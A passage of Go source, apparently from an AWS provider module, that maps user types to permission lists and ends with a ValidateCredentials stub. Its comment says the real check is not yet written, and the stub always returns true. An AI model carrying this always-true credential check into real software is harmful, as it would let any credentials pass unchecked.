			permissions = []string{"Access Denied"}
		}
	} else if userType == "Root User" {
		// Root用户拥有所有权限
		permissions = []string{"All Permissions"}
	} else {
		// 未知用户类型
		permissions = []string{"Unknown"}
	}

	return map[string]interface{}{
		"message":     "Permissions retrieved",
		"userType":    userType,
		"userName":    userName,
		"permissions": permissions,
	}, nil
}

// ValidateCredentials 验证凭证
func (p *AWSProvider) ValidateCredentials() (bool, error) {
	// 这里应该实现AWS凭证验证逻辑
	// 暂时返回模拟数据
	return true, nil
}
